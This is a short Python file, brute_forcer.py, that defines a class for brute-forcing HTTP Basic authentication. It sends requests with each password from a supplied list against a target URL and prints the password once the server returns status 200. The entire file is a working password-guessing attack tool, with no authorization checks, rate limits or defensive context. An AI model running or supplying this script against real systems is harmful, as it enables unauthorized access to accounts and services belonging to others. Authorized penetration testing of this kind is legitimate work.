# brute_forcer.py
import requests
from requests.auth import HTTPBasicAuth

class HTTPBruteForcer:
    def __init__(self, url, username, password_list):
        self.url = url
        self.username = username
        self.password_list = password_list

    def run(self):
        print(f"Starting brute force on {self.url} with username '{self.username}'...")
        for password in self.password_list:
            try:
                response = requests.get(self.url, auth=HTTPBasicAuth(self.username, password))
                if response.status_code == 200:
                    print(f"[+] Password found: {password}")
                    return password
                else:
                    print(f"Trying password: {password}")
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
        print("[-] Password not found in list.")
        return None
